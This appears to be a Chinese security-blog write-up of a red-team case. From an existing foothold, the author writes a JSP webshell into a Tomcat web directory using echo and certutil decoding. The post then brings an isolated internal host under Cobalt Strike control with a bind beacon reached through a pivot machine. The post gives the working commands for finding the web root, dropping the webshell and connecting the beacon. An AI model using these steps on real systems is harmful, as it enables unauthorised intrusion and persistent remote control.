# 一次不出网上线cs实战案例

阅读量 **143240**

发布时间 : 2022-07-27 10:00:06

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t01b7822e0c66bf245a.jpg)

## 场景

shiro打点获取10段服务器权限，在10段机器出网且已上线cs；172段不出网且反向不通10段，已通过mysql弱口令获取system权限，存在web服务。

## 上线过程

思路：写入webshell，通过正向马上线cs。

###  getshell

通过web服务获取一个web目录下的文件名：stf-login-bg.jpg

![](https://p0.ssl.qhimg.com/t01fb90b30b4a5bab1b.png)

获取所有盘符

    
    
    wmic logicaldisk get caption,name
    

![](https://p0.ssl.qhimg.com/t01b983fd8bbd1b0012.png)

通过文件名获取web目录

    
    
    dir /a /s /b d:\"stf-login-bg.jpg"
    

![](https://p1.ssl.qhimg.com/t01932f7ed28489fbc3.png)

根据图片URL确定D:\apache-tomcat-7.0.73-windows-x64\apache-tomcat-7.0.73\webapps\ROOT\static\images\login\stf-login-bg.jpg为真实web路径，使用\可dir到此路径。

![](https://p5.ssl.qhimg.com/t01d48e9e4e2ddb73f7.png)

echo配合certutil写入webshell：

    
    
    //base64编码shell.jsp
    certutil -encode shell.jsp jsp.txt 
    
    //echo编码后的内容到web目录
    echo xxxx >D:\\apache-tomcat-7.0.73-windows-x64\\apache-tomcat-7.0.73\\webapps\\ROOT\\static\\images\\login\\12.txt
    
    //解码还原文件
    certutil -decode D:\\apache-tomcat-7.0.73-windows-x64\\apache-tomcat-7.0.73\\webapps\\ROOT\\static\\images\\login\\12.txt D:\\apache-tomcat-7.0.73-windows-x64\\apache-tomcat-7.0.73\\webapps\\ROOT\\static\\images\\login\\123.jsp
    

![](https://p5.ssl.qhimg.com/t01be913534ffc955a0.png)

![](https://p0.ssl.qhimg.com/t01ad28322473c715b1.png)

###  上线cs

新建监听器

![](https://p5.ssl.qhimg.com/t01406795a53b3ff43c.png)

生成正向马

![](https://p3.ssl.qhimg.com/t0114e191fd7be8ef7e.png)

![](https://p5.ssl.qhimg.com/t01b21ff95b550fb28e.png)

通过webshell上传到目标机器并执行，使用跳板机连接，上线cs。

    
    
    connect 172.20.57.122 28888
    

![](https://p4.ssl.qhimg.com/t0130e237a453efb6b1.png)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Tide安全团队** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/276882](/post/id/276882)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CS](/tag/CS)

 **+1** __0赞

 __收藏

![](https://p5.ssl.qhimg.com/t013dca47abc465f8d2.png) Tide安全团队

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

